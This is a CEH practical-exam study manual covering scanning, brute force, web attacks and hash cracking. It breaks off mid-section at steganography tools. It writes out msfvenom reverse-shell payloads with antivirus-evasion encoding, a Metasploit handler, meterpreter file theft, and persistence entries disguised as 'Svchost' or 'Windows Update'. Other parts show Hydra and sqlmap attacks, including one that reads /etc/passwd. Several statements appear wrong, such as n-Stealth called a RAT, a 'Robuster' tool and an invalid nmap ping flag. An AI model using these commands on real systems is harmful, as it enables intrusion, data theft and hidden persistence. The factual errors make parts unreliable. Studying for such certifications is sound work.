# CEH v13 Practical Exam - Complete Study Manual

**Version:** 2.0 - INTEGRATED WITH ENHANCEMENTS  
**Last Updated:** June 21, 2026  
**Status:** GitHub Pages Ready  
**Exam Duration:** 6 Hours  
**Passing Score:** 70% (14 out of 20 challenges)  
**Certificate Validity:** 3 Years  
**Target Audience:** Exam-takers with open-book access during practical exam

---

## How to Use This Manual

This manual is designed as an **open-book reference during your 6-hour practical exam**. It contains:

- **Domain-by-domain breakdown** of all 7 exam domains with command syntax
- **Real challenge examples** with step-by-step solutions
- **Tools reference section** for quick command lookup
- **Exam strategy** for time management and answer formatting
- **Cross-referenced navigation** to jump between related topics
- **Advanced tool sections** for RAT detection, PE analysis, MQTT, tcpdump/tshark, OS fingerprinting

**During the Exam:**
1. Keep this manual accessible in a browser tab
2. Use Ctrl+F to search for specific tools or commands
3. Reference challenge examples for similar scenarios
4. Check "Critical Success Factors" when stuck on format

---

## Quick Navigation

- [Exam Overview](#exam-overview)
- [Domain 1: Network Scanning & Enumeration](#domain-1-network-scanning--enumeration)
- [Domain 2: System Hacking & Exploitation](#domain-2-system-hacking--exploitation)
- [Domain 3: Web Server & Application Hacking](#domain-3-web-server--application-hacking)
- [Domain 4: Cryptography & Steganography](#domain-4-cryptography--steganography)
- [Domain 5: Mobile & IoT Security](#domain-5-mobile--iot-security)
- [Domain 6: Traffic Analysis & Sniffing](#domain-6-traffic-analysis--sniffing)
- [Domain 7: Wireless Network Cracking](#domain-7-wireless-network-cracking)
- [Essential Tools Reference](#essential-tools-reference)
- [Exam Strategy & Tips](#exam-strategy--tips)

---

## Table of Contents

1. [Exam Overview & Core Concepts](#exam-overview)
   - What is the CEH Practical Exam
   - Exam Format, Duration & Scoring
   - Operating Systems & Environment
   - Core Competencies Required

2. [Domain 1: Network Scanning & Enumeration](#domain-1-network-scanning--enumeration)
   - Host Discovery (NMAP Ping Scans)
   - Port Scanning (TCP, UDP, SYN)
   - Service Version Detection (-sV flag)
   - SMB Enumeration (NMAP scripts, Enum4Linux)
   - SNMP Enumeration
   - DNS Enumeration
   - Challenge Examples & Solutions

3. [Domain 2: System Hacking & Exploitation](#domain-2-system-hacking--exploitation)
   - Remote Access Trojan (RAT) Fundamentals
   - RDP Cracking (Hydra bruteforce)
   - File Encryption & Decryption (CryptoForge, SHA hashing)
   - SMB Exploitation (Weak credentials, share access)
   - Hydra - General Credential Cracking
   - Challenge Examples & Solutions

4. [Domain 3: Web Server & Application Hacking](#domain-3-web-server--application-hacking)
   - SQL Injection (SQLMAP automated exploitation)
   - Web Directory Enumeration (Nikto, Robuster)
   - DVWA - Vulnerable Web Application
   - Parameter Tampering
   - WordPress Scanning (WPScan)
   - Challenge Examples & Solutions

5. [Domain 4: Cryptography & Steganography](#domain-4-cryptography--steganography)
   - Hash Identification & Cracking (Hashcat, John)
   - File Steganography (Steghide, Stegcracker)
   - VeraCrypt - Encrypted Volume Cracking
   - PE File Analysis - Malware Static Analysis
   - Challenge Examples & Solutions

6. [Domain 5: Mobile & IoT Security](#domain-5-mobile--iot-security)
   - Android Device Access via ADB
   - Advanced ADB Workflows
   - Android Steganography & Database Extraction
   - Analyzing Extracted Android Data
   - Challenge Examples

7. [Domain 6: Traffic Analysis & Sniffing](#domain-6-traffic-analysis--sniffing)
   - Wireshark - Network Packet Analysis
   - Tcpdump - Command-Line Packet Capture
   - Tshark - CLI Wireshark Analysis
   - DDoS Attack Analysis
   - OS Fingerprinting & TTL Analysis
   - IoT & MQTT Protocol Analysis
   - Challenge Examples

8. [Domain 7: Wireless Network Cracking](#domain-7-wireless-network-cracking)
   - WPA/WPA2 Password Cracking (Aircrack-ng)
   - Wireless Attack Workflow (5 steps)
   - Challenge Examples

9. [Essential Tools Reference](#essential-tools-reference)
   - Scanning & Enumeration Tools
   - Credential Cracking Tools
   - Web Application Testing Tools
   - Cryptography & Steganography Tools
   - Network Analysis Tools
   - Mobile & IoT Tools
   - Advanced Analysis Tools

10. [Exam Strategy & Tips](#exam-strategy--tips)
    - Pre-Exam Preparation
    - 6-Hour Time Management Strategy
    - Critical Success Factors
    - Common Mistakes to Avoid
    - Practice Challenges Breakdown
    - Challenge Clustering by Difficulty
    - Exam Day Checklist

---

## Exam Overview

### What is the CEH Practical Exam?

The Certified Ethical Hacker (Practical) is a real-world, hands-on exam testing your ability to identify and exploit security vulnerabilities. You'll work through 20 real-world scenarios using actual hacking tools and techniques within a 6-hour window.

**Key Points:**
- Browser-based exam environment (iLabs Cyber Range)
- Two operating systems provided: Parrot OS and Windows 7/11
- You can use the internet to look up information (but not ask people or chat)
- Takes place on a website called iLab with virtual machines
- Proctor monitors via GoToMeeting throughout the exam

> **TIP:** This is a practical exam, not multiple choice. You must actually exploit vulnerabilities and submit exact answers. No partial credit.

### How the Exam Works

**Before You Start:**
- Account creation on EC-Council's Aspen portal
- Purchase exam voucher from the official EC-Council store
- Schedule your exam date
- Identity verification via proctor

**During the Exam:**
- Start with easy challenges first (scanning/reconnaissance)
- Work through challenges sequentially
- Answer is formatted exactly as specified (case-sensitive for letters)
- Can move to next challenge and return later
- Use tools provided in the environment

**Timing Strategy:**
- Spend 15-20 minutes per challenge on average
- Start with NMAP scans (they take time, so run them first)
- Return to scanning results while working other challenges
- Skip hard challenges and come back if time permits

### What You'll Need to Know

**Operating Systems:**
- Linux (Parrot Security OS / Kali)
- Windows (7 or 11)
- Basic command-line navigation
- File system basics

**Core Competencies:**
- Network reconnaissance and mapping
- Service enumeration and exploitation
- Credential cracking (RDP, FTP, SSH, SMB, SQL)
- Web application testing (SQL injection, parameter tampering)
- Cryptography and file encryption/decryption
- Mobile device access (Android via ADB)
- Packet analysis and traffic inspection
- Wireless network penetration testing
- Remote Access Trojan (RAT) detection
- Operating System fingerprinting via TTL analysis
- MQTT IoT protocol analysis

---

## Domain 1: Network Scanning & Enumeration

### Why This Matters

Network scanning is the foundation of every penetration test. You need to discover what's on the network, what ports are open, and what services are running. This is where you gather the intelligence to plan your attacks.

Think of it like reconnaissance: a burglar doesn't just kick down the door—they case the joint first, checking doors and windows.

> **EXAM TIP:** Always start with comprehensive network scans immediately—they take time to run. Work on other challenges while scans complete.

### 1.1 Host Discovery - Finding Live Machines

**What it does:** Identifies which IP addresses have active machines on them.

#### Command: NMAP Ping Scan

```bash
nmap -sn 192.168.1.0/24
```

**Breakdown:**
- `-sn` = Ping scan only (don't do port scanning)
- `192.168.1.0/24` = Check all 256 IPs in this range
- Shows which machines are alive
- Much faster than checking every single IP manually

**Alternative Methods:**
```bash
# ARP ping (works locally on network)
nmap -sP 10.10.55.0/24

# TCP SYN ping (useful if ICMP is blocked)
nmap -sS -P 10.10.55.0/24

# UDP ping (alternative method)
nmap -sU -P 10.10.55.0/24

# Using netdiscover tool
netdiscover -i eth0 -r 192.168.1.0/24
```

**Expected Output:**
```
Starting Nmap...
Nmap scan report for 192.168.1.1
Host is up (0.0023s latency).
Nmap scan report for 192.168.1.5
Host is up (0.0045s latency).
```

**Why This Matters:** Helps you quickly identify active targets in large networks without wasting time on dead IPs.

---

### 1.2 Port Scanning - What Services Are Running

**What it does:** Checks specific ports on a host to see if services are listening.

#### The Three Main Scan Types

**TCP Connect Scan (Full Connection)**
```bash
nmap -sT -v 192.168.1.5
```
- Complete three-way handshake
- Slowest but most reliable
- Leaves logs on target
- Use when you're not worried about stealth

**TCP SYN Scan (Half-Open / Stealthy)**
```bash
nmap -sS -v 192.168.1.5
```
- Sends SYN, waits for SYN-ACK, sends RST (no completion)
- Faster than full connect
- Less logging on older systems
- Preferred for most scans

**UDP Scan**
```bash
nmap -sU -v 192.168.1.5
```
- Tests UDP ports (SNMP, DNS, DHCP)
- Slower and less reliable
- Use when targeting specific UDP services

#### Common Port Scanning Commands

```bash
# Scan specific ports on target
nmap -p 22,80,443 192.168.1.5

# Scan ports 1-1000 on target
nmap -p 1-1000 192.168.1.5

# Scan ALL 65535 ports (thorough but slow)
nmap -p- 192.168.1.5

# Fast scan (only top 100 ports)
nmap -F 192.168.1.5

# Aggressive scan with OS detection
nmap -A -T4 192.168.1.5

# Show only open ports
nmap --open 192.168.1.5
```

**Understanding Port States:**

| State | Meaning | Action |
|-------|---------|--------|
| **Open** | Service is listening and accepting connections | Exploit or enumerate |
| **Closed** | Port responded but no service is listening | Usually safe to ignore |
| **Filtered** | Firewall is blocking the port | May indicate protected service |
| **Unfiltered** | Port is accessible but unclear if service exists | Investigate further |

> **EXAM MISTAKE:** Don't skip ports because "standard" tools seem comprehensive. Always scan all 65,535 ports on key targets—MariaDB might be on 3307, not 3306.

---

### 1.3 Service Version Detection - What Software is Running

**What it does:** Identifies specific software and version numbers running on open ports.

```bash
nmap -sV 192.168.1.5
```

**Breakdown:**
- `-sV` = Version detection
- Connects to each open port and fingerprints the service
- Returns software name and version
- Takes longer than basic port scan

**Example Output:**
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6
443/tcp open  https   Apache httpd 2.4.6
3306/tcp open mysql  MySQL 5.7.17
```

**Why This Matters:** Version numbers let you know if the software has known exploits. Old versions = more vulnerabilities.

#### Comprehensive Scanning

The "gold standard" for initial reconnaissance:

```bash
nmap -A -T4 -p- 192.168.1.5
```

**Breakdown:**
- `-A` = All: enables OS detection, version detection, script scanning
- `-T4` = Timing template (faster, less stealthy)
- `-p-` = All 65,535 ports
- Returns comprehensive information about the target

---

### 1.4 SMB Enumeration - Finding Windows Shared Resources

**What it does:** Discovers Windows file shares, users, and domain information.

#### NMAP SMB Scripts

```bash
# Discover OS, domain, workgroup
nmap --script smb-os-discovery.nse -p445 192.168.1.5
```

**Expected Output:**
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-os-discovery:
|   OS: Windows 7 (Build 7601)
|   Computer name: WORKSTATION1
|   Domain: ACME
|   Workgroup: WORKGROUP
```

```bash
# Enumerate users on Windows system
nmap --script smb-enum-users.nse -p445 192.168.1.5
```

```bash
# Enumerate shares available
nmap -p445 --script=smb-enum-shares.nse 192.168.1.5
```

**Expected Output:**
```
HOST|445|smb-enum-shares:
  Share        Type  Comment
  ----         ----  -------
  C$           STYPE_DISKTREE  Default share
  IPC$         STYPE_IPC       Remote IPC
  Users        STYPE_DISKTREE  User files
  Documents    STYPE_DISKTREE  Shared documents
```

#### Using SMBClient for Access

```bash
# List shares on a system
smbclient -L 192.168.1.5

# Access a share
smbclient //192.168.1.5/Documents

# Download files
smbget -R smb://192.168.1.5/Documents
```

#### Enum4Linux - Comprehensive SMB Enumeration

```bash
# Get all info (-a for all)
enum4linux -a 192.168.1.5

# Get users only (-U)
enum4linux -U 192.168.1.5

# Get shares only (-S)
enum4linux -S 192.168.1.5

# Get groups (-G)
enum4linux -G 192.168.1.5

# Get password policy (-P)
enum4linux -P 192.168.1.5

# With credentials
enum4linux -u admin -p password123 -a 192.168.1.5
```

**Why This Matters:** SMB often reveals user names, domain structure, and accessible file shares without any authentication.

---

### 1.5 SNMP Enumeration - Extracting System Information

**What it does:** Queries network devices (routers, printers, servers) for configuration info.

SNMP is like a public information billboard for network devices. Many admins leave it with default credentials.

```bash
# Basic SNMP check
nmap -sU -p 161 --script snmp-processes.nse 192.168.1.5

# Using snmp-check tool
snmp-check 192.168.1.5

# Using onesixtyone for SNMP discovery
onesixtyone 192.168.1.0/24
```

**Common SNMP Community Strings (Passwords):**
- `public` (read-only, default)
- `private` (read-write)
- `community`
- `manager`

---

### 1.6 DNS Enumeration - Finding Hostnames and IPs

**What it does:** Maps domain names to IP addresses and discovers subdomains.

```bash
# DNS lookup
nslookup target.com

# More detailed DNS lookup
dig target.com

# Zone transfer attempt (finds all DNS records)
dig @ns1.target.com target.com axfr

# Reverse DNS lookup (IP to hostname)
nslookup 192.168.1.5
```

**Online DNS Tools:**
- https://www.nslookup.io/ (browser-based, useful during exam)

---

### Challenge Examples: Domain 1

#### Challenge 1: Find Domain Controller DNS Name

**Question:** Conduct a comprehensive scan of the network to identify the DNS computer name of the Domain Controller.

**Answer Format:** AaaaaAaaa*AAAAAA*aaa

**Solution Steps:**

1. Run aggressive NMAP scan with OS detection:
```bash
nmap -A -T4 192.168.1.0/24
```

2. Look for Windows domain controllers (usually port 389/LDAP, 445/SMB)

3. Use SMB enumeration to get domain info:
```bash
nmap --script smb-os-discovery.nse -p445 [DC_IP]
```

4. Computer name will be in the output

#### Challenge 2: Find IMAP Mercury Service Version

**Question:** Identify the version of the IMAP Mercury service running on a Windows development server.

**Answer Format:** N*NN (Example: 1.45)

**Solution Steps:**

1. Scan all ports looking for IMAP (usually 143 or 993):
```bash
nmap -A -T4 -p- 192.168.1.0/24
```

2. Find IMAP port and connect:
```bash
nmap -sV -p 143 192.168.1.50
```

3. Output will show version information

---

## Domain 2: System Hacking & Exploitation

### Why This Matters

This domain covers breaking into systems and maintaining access. You'll need to crack credentials, exploit vulnerabilities, and maintain persistence.

---

### 2.1 Remote Access Trojan (RAT) Fundamentals

**What is a RAT?**

A **Remote Access Trojan (RAT)** is malware that gives an attacker complete remote control over a victim's computer, similar to legitimate remote administration tools but without authorization.

**Key Characteristics:**
- **Backdoor Access:** Hidden method to reconnect
- **Full System Control:** Execute commands, access files
- **Persistence:** Survives reboots via registry/cron jobs
- **Stealth:** Often hides processes and network connections
- **Data Exfiltration:** Can steal files and credentials

**Difference from Other Malware:**

| Type | Control | Purpose |
|------|---------|---------|
| RAT | Complete remote shell | Full system access |
| Worm | Self-replicating | Spread across network |
| Spyware | Limited (stealing data) | Surveillance only |
| Trojan | Backdoor only | Initial access |

#### Common RAT Tools

**1. Metasploit Meterpreter**
- Part of Metasploit Framework
- Payload-based staging
- Reverse shells most common
- Used in exam

**2. n-Stealth**
- Commercial RAT from mid-2000s
- IP address-based access
- Simple command shell
- May appear in exam case studies

**3. Poison Ivy**
- Older RAT (discontinued)
- Lightweight, low detection
- Historical reference in exams

**4. BackOrifice**
- Very old Windows RAT (Windows 95/98)
- Historical only, not used today
- Exam context: malware analysis

**5. Real VNC / TeamViewer**
- Legitimate remote tools
- Can be ABUSED by attackers
- Used as RAT if credentials compromised

#### How RATs Work: Attack Chain

**Phase 1: Initial Access**
```
1. Attacker delivers payload (email, website, exploit)
2. Victim executes malware
3. RAT installs itself on system
```

**Phase 2: Persistence**
```
Windows:
- Add to HKEY_LOCAL_MACHINE\Run registry
- Create scheduled task
- Hide in startup folder
- DLL injection

Linux/Mac:
- Add to ~/.bashrc or ~/.bash_profile
- Create cron job
- systemd service
```

**Phase 3: Communication (Reverse Shell)**
```
Victim initiates connection to attacker (avoiding firewalls):
victim_machine:random_port → attacker_ip:listening_port
Attacker gains shell prompt on victim
```

**Phase 4: Command Execution**
```
Attacker types commands:
> whoami
> cd c:\Users
> dir
> ipconfig /all
> net user administrator NewPassword123
Victim executes, returns output to attacker
```

**Phase 5: Data Exfiltration**
```
> move c:\important\file.txt c:\temp\
> type c:\temp\file.txt
> [data sent to attacker]
```

#### Meterpreter Session Basics

**Session Types:**

1. **Reverse TCP Shell**
   ```
   Victim connects back to attacker
   Attacker IP: 192.168.1.100 port 4444
   Victim connects: 192.168.1.50:12345 → 192.168.1.100:4444
   Advantages: Bypasses firewall (outbound allowed)
   ```

2. **Bind Shell**
   ```
   Attacker connects to victim
   Victim listens on port 4444
   Attacker connects: 192.168.1.100 → 192.168.1.50:4444
   Advantages: Simpler setup
   Disadvantages: Firewall may block inbound
   ```

**Session Management:**

```
# List active sessions
sessions -l

# Interact with session 1
sessions -i 1

# Background current session
[Ctrl+Z] or type: background

# List running jobs
jobs -l

# Interact with background job
jobs -i 1

# Kill session
sessions -k 1
```

#### Payload Generation with Msfvenom

**Basic Reverse Shell (Windows):**

```bash
# Generate .exe payload (Metasploit)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe > backdoor.exe

# Generate .bat file
msfvenom -p windows/cmd/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f bat > shell.bat

# Generate for Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf > linux_shell
```

**Obfuscation Techniques:**

```bash
# Add encoder to evade AV
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe > obfuscated.exe

# Flags:
# -e = Encoder
# -i = Iterations (5 passes)
# -f = Format (exe, dll, bat, etc)
```

#### Metasploit Handler (Listener Setup)

**Starting Handler:**

```bash
# Launch Metasploit
msfconsole

# Setup handler for reverse TCP
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> set LPORT 4444
msf> run

# Handler now listening on port 4444
# Waiting for victim to connect...
```

**When Victim Connects:**

```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending stage (173 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 <- 192.168.1.50:63842)

meterpreter >
```

#### Meterpreter Command Execution

**System Information:**

```
meterpreter > getuid
Server username: DESKTOP-ABC1234\Administrator

meterpreter > sysinfo
Computer Name: DESKTOP-ABC1234
OS: Windows 10 (build 19045)
Architecture: x64
Processors: 4
RAM: 8192 MB

meterpreter > ipconfig
IPv4 Address: 192.168.1.50
Subnet Mask: 255.255.255.0
Gateway: 192.168.1.1
```

**File Operations:**

```
meterpreter > pwd
c:\Users\Admin\Desktop

meterpreter > ls
Mode   Size  Type  Modified              Name
----   ----  ----  --------              ----
20666  2048  dir   2024-06-21 14:32:01  Documents
20666  2048  dir   2024-06-21 14:32:01  Downloads
100666 5242  file  2024-06-21 14:30:15  passwords.txt

meterpreter > download passwords.txt /tmp/
[*] Downloading: passwords.txt -> /tmp/passwords.txt
[*] Downloaded 5242 bytes

meterpreter > upload /tmp/evil.exe c:\windows\temp\
[*] uploading  : /tmp/evil.exe -> c:\windows\temp\evil.exe
[*] Uploaded 76289 bytes
```

**Process & Registry Access:**

```
meterpreter > ps  # List processes
meterpreter > kill PID  # Kill process
meterpreter > execute -f cmd.exe -i  # Interactive command shell
meterpreter > reg query HKLM\\Software\\Microsoft\\Windows\\Run
meterpreter > reg set HKLM\\Software\\Microsoft\\Windows\\Run "Svchost" "c:\windows\temp\evil.exe"
```

#### Data Exfiltration Patterns

**Detecting RAT Activity in Network Traffic:**

1. **Reverse TCP Connections**
   - Victim initiates outbound connection to attacker IP
   - Unusual ports (not web, email, DNS)
   - Persistent connection (hours/days)

2. **Command Data**
   - Small uploads (commands ~50-200 bytes)
   - Large downloads (stolen files)
   - Bidirectional traffic pattern

3. **Indicators in Wireshark:**
   ```
   Filter: ip.src == 192.168.1.50 && tcp.dstport != 80,443,53
   Look for: Persistent connections to external IPs
   
   Follow TCP Stream: Contains command output/shell interaction
   ```

4. **File Exfiltration**
   - Sudden large upload from victim
   - Destination: Attacker IP
   - Protocol: Reverse shell or FTP/SMB tunnel

#### Persistence Mechanisms

**Windows Registry (Survives Reboot):**

```batch
# Run key - starts on login
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d "c:\windows\temp\evil.exe"

# Services - runs as system
sc create Svchost binPath= "c:\windows\temp\evil.exe"
sc start Svchost

# Task Scheduler
schtasks /create /tn "Windows Update" /tr "c:\windows\temp\evil.exe" /sc onlogon
```

**Linux Persistence:**

```bash
# Add to cron (every 5 minutes)
crontab -e
*/5 * * * * /tmp/backdoor

# Add to .bashrc (every shell)
echo "/tmp/backdoor &" >> ~/.bashrc

# systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/svc
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable backdoor
```

#### Challenge 10: Detecting RAT in PCAP

**Scenario:** Analyze network traffic to identify RAT activity

**What to Look For:**

1. **Reverse Connection Pattern**
   ```
   Victim IP → Unknown External IP on non-standard port
   Example: 192.168.1.50 → 203.0.113.45 on port 4444
   This is suspicious - should be inbound traffic for normal services
   ```

2. **Suspicious Ports**
   - 4444, 5555, 6666, 7777, 8888 (common Metasploit)
   - 31337 (classic backdoor port)
   - Random high ports (>10000)

3. **Bidirectional Data Flow**
   - Small upstream packets (commands)
   - Small downstream packets (command output)
   - Not typical of web, email, or file transfer

4. **Long Duration Connection**
   - Single TCP session lasting hours/days
   - Other services use short sessions
   - Example: HTTP connection = 1-5 minutes, RAT = persistent

**Wireshark Analysis Steps:**

```
1. Open PCAP file
2. Filter: ip.dst == <external_ip>
3. Look for anomalies:
   - Reverse TCP connection
   - Unusual port
   - Long duration
   - No corresponding inbound traffic

4. Extract data: Follow TCP Stream
   - Look for shell commands
   - Look for command output
   - Note any file transfers

5. Identify attacker IP and port
```

**Exam Answer Format:**

```
Q: "What IP address initiated the RAT connection?"
A: 203.0.113.45

Q: "What port was the RAT listening on?"
A: 4444

Q: "What commands were executed?"
A: ipconfig, whoami, dir, net user

Q: "What files were exfiltrated?"
A: C:\Users\Admin\Documents\passwords.txt
```

---

### 2.2 RDP Cracking - Brute Forcing Remote Desktop

**What it does:** Uses Hydra to crack Windows RDP credentials via brute force.

#### Hydra RDP Cracking

```bash
# Basic RDP crack
hydra -l Administrator -P rockyou.txt rdp://192.168.1.5

# With specific username
hydra -l admin -P password_list.txt rdp://192.168.1.50:3389

# Try multiple usernames
hydra -L usernames.txt -P passwords.txt rdp://192.168.1.5

# Verbose output (see attempts)
hydra -l admin -P passwords.txt rdp://192.168.1.5 -v
```

**Expected Output:**
```
[3389][rdp] host: 192.168.1.50   login: Administrator   password: MyPassword123
[STATUS] 4523 tries/min, 4523 done in 1:00, 95477 to do in 21:00s
```

---

### 2.3 File Encryption & Decryption

**What it does:** Identifies encrypted files and attempts decryption or password cracking.

#### Using CryptoForge to Test Encryption

CryptoForge is a Windows encryption tool that can be used to:
- Encrypt sensitive files
- Test password strength
- Create encrypted containers

#### SHA Hash Cracking

```bash
# Identify hash type
hashid hashvalue

# Crack SHA1
hashcat -m 100 -a 0 hashfile rockyou.txt

# Crack SHA256
hashcat -m 1400 -a 0 hashfile rockyou.txt
```

---

### 2.4 SMB Exploitation - Accessing Shares with Weak Credentials

**What it does:** Uses discovered weak credentials to access SMB shares and extract files.

#### SMBClient with Credentials

```bash
# Access share with username/password
smbclient //192.168.1.5/Documents -U admin%password123

# List directories in share
ls

# Download files
get secret.txt

# Download entire directory
recurse ON
mget *
```

---

### 2.5 Hydra - General Credential Cracking

**What it does:** Brute-force attacks against many different services.

#### Hydra Syntax

```bash
hydra [options] -l [username] -P [password_list] [service]://[target]
```

**Common Services:**

```bash
# SSH cracking
hydra -l root -P rockyou.txt ssh://192.168.1.5

# FTP cracking
hydra -l admin -P rockyou.txt ftp://192.168.1.5

# HTTP-POST cracking
hydra -l admin -P rockyou.txt http-post-form://192.168.1.5:80/login.php:username=^USER^&password=^PASS^

# MySQL cracking
hydra -l root -P rockyou.txt mysql://192.168.1.5:3306

# MSSQL cracking
hydra -l sa -P rockyou.txt mssql://192.168.1.5:1433
```

#### Hydra Options

```bash
# Use both username and password wordlists
hydra -L users.txt -P passwords.txt service://target

# Verbose output
hydra -l admin -P pass.txt rdp://target -v

# Stop after first found password
hydra -l admin -P pass.txt rdp://target -f

# Use specific port
hydra -l admin -P pass.txt ssh://192.168.1.5:2222

# Try default credentials
hydra -l admin -p admin rdp://192.168.1.5
```

---

### Challenge Examples: Domain 2

#### Challenge 5: Crack RDP Credentials

**Question:** Crack the Windows RDP password for user "Admin" on target system.

**Answer Format:** AaaAaa*aaaa

**Solution Steps:**

1. Identify RDP port (usually 3389):
```bash
nmap -p 3389 192.168.1.50
```

2. Run Hydra brute force:
```bash
hydra -l Admin -P rockyou.txt rdp://192.168.1.50:3389 -v
```

3. Wait for successful login message showing password

4. Extract password and format answer

#### Challenge 6: Find Encrypted Password in Registry

**Question:** Connect via RDP with cracked credentials, find password stored in registry.

**Answer Format:** AaaaaaAaa*AAA

**Solution Steps:**

1. Use RDP client to connect:
```bash
xfreerdp /u:Admin /p:PASSWORD /v:192.168.1.50
```

2. Once connected, open Command Prompt

3. Query registry for stored passwords:
```batch
reg query HKLM\Software\Microsoft\Windows /s | findstr /i password
```

4. Extract found password

---

## Domain 3: Web Server & Application Hacking

### Why This Matters

Web applications are common targets. SQL injection, directory traversal, and parameter tampering allow attackers to bypass authentication and steal data.

---

### 3.1 SQL Injection - Automated Exploitation

**What it does:** Automatically finds and exploits SQL injection vulnerabilities.

#### Using SQLMAP

```bash
# Basic SQL injection test
sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs

# Specify POST data
sqlmap -u "http://192.168.1.5/login.php" --data "user=admin&pass=test" --dbs

# Enumerate tables
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name --tables

# Dump table data
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name -T users --dump

# Read files from server
sqlmap -u "http://192.168.1.5/page.php?id=1" --file-read="/etc/passwd"
```

---

### 3.2 Web Directory Enumeration

**What it does:** Finds hidden directories and files on web servers.

#### Using Nikto

```bash
# Basic scan
nikto -h http://192.168.1.5

# Save report
nikto -h http://192.168.1.5 -o report.txt

# Specific port
nikto -h 192.168.1.5 -p 8080
```

#### Using Robuster

```bash
# Directory brute force
robuster dir -u http://192.168.1.5 -w wordlist.txt

# Common directories
robuster dir -u http://192.168.1.5 -w /usr/share/wordlists/dirb/common.txt
```

---

### 3.3 DVWA - Vulnerable Web Application

DVWA (Damn Vulnerable Web Application) is a practice environment for web testing.

#### Common DVWA Vulnerabilities

1. **Brute Force** - Weak authentication
2. **Command Injection** - OS command execution
3. **CSRF** - Cross-Site Request Forgery
4. **File Inclusion** - Local/Remote File Include
5. **SQL Injection** - Database manipulation
6. **Weak Session IDs** - Predictable sessions

---

### 3.4 Parameter Tampering

**What it does:** Modifies URL/POST parameters to bypass security.

#### Example Attack

Original: `http://site.com/purchase.php?item=shirt&price=10`

Modified: `http://site.com/purchase.php?item=shirt&price=1` (price reduced)

#### Using Burp Suite to Tamper

1. Enable Burp Suite proxy
2. Capture request
3. Modify parameters
4. Forward request
5. Observe application response

---

### 3.5 WordPress Scanning

**What it does:** Identifies WordPress plugins, themes, and users.

#### Using WPScan

```bash
# Enumerate users
wpscan --url http://target.com --enumerate u

# Enumerate plugins
wpscan --url http://target.com --enumerate p

# Enumerate themes
wpscan --url http://target.com --enumerate t

# Full enumeration
wpscan --url http://target.com --enumerate all

# Brute force admin password
wpscan --url http://target.com -U admin -P rockyou.txt
```

---

### Challenge Examples: Domain 3

#### Challenge 3: SQL Injection - Extract Database

**Question:** Use SQL injection to extract data from victim database.

**Answer Format:** NaaAaa*aaa*aaaaa

**Solution Steps:**

1. Identify SQL injection point:
```bash
sqlmap -u "http://192.168.1.5/page.php?id=1" -v
```

2. List databases:
```bash
sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs
```

3. Enumerate tables:
```bash
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name --tables
```

4. Dump sensitive table:
```bash
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name -T users --dump
```

5. Extract answer from output

#### Challenge 16: Path Traversal / Directory Enumeration

**Question:** Find hidden admin directory on web server.

**Answer Format:** /admin*area

**Solution Steps:**

1. Run Nikto scan:
```bash
nikto -h http://192.168.1.50
```

2. Or use Robuster:
```bash
robuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt
```

3. Look for 200 responses (found directories)

4. Test found directories in browser

5. Find admin-related directory

---

## Domain 4: Cryptography & Steganography

### Why This Matters

Encryption protects data. Hash cracking recovers passwords. Steganography hides data. These skills let you extract hidden information.

---

### 4.1 Hash Identification & Cracking

**What it does:** Identifies hash types and cracks them with wordlists.

#### Hash Type Identification

```bash
# Using hashid
hashid hash_value

# Output: Possible hash types

# Example:
# Hash Type: SHA1
# Hash Mode: 100 (Hashcat)
# CRC32 Hash Mode: 11500
```

**Common Hash Types:**

| Type | Length | Example |
|------|--------|---------|
| MD5 | 32 | 5d41402abc4b2a76b9719d911017c592 |
| SHA1 | 40 | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| SHA256 | 64 | 2c26b46911185131006145dd0c1ae4c2e873f5cdfb09b91476d61542ea5a0e28 |
| NTLM (Windows) | 32 | e52caf7c4dfbc7d020b4d6b620726e79 |
| bcrypt | 60 | $2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcg7b3XeKeUxWdeS86E36P4rWjO |

#### Using Hashcat to Crack

```bash
# MD5 hash
hashcat -m 0 -a 0 hashfile rockyou.txt

# SHA1 hash
hashcat -m 100 -a 0 hashfile rockyou.txt

# SHA256 hash
hashcat -m 1400 -a 0 hashfile rockyou.txt

# NTLM (Windows)
hashcat -m 1000 -a 0 hashfile rockyou.txt

# bcrypt
hashcat -m 3200 -a 0 hashfile rockyou.txt
```

#### Using John the Ripper

```bash
# Auto-detect hash type
john hashes.txt --wordlist=rockyou.txt

# Specify format
john --format=md5 hashes.txt --wordlist=rockyou.txt

# Show cracked passwords
john --show hashes.txt
```

---

### 4.2 File Steganography

**What it does:** Hides data inside image files, then extracts it.

#### Using Steghide

```bash
# Extract hidden data
steghide extract -sf image.jpg

# Interactive mode (prompts for passphrase)
# Leave empty if no passphrase

# Non-interactive (no passphrase)
steghide extract -sf image.jpg -xf output.txt -p ""

# Check if file contains hidden data
steghide info image.jpg
```

#### Using Stegcracker

```bash
# Crack steganography with wordlist
stegcracker image.jpg wordlist.txt

